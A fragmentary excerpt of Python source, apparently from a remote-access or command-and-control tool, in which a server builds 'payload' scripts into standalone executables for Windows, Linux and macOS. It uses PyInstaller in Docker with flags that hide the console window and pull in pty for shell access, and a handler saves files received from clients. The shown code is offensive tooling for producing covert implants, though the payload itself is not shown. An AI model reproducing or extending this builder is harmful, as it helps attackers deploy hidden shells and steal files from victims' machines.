...
#{uuid.uuid4()}"""
        ...
        if os_name == "Windows":
            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
            ...
            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
            print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
            shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")

        elif os_name == "OSX":
            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
            print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
            shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
    ...
    def save_file(self, sid, data):
        ...
        with open(f"files_saved/{data['uuid']}_{current_date}_{data['file_name']}", 'wb') as f:
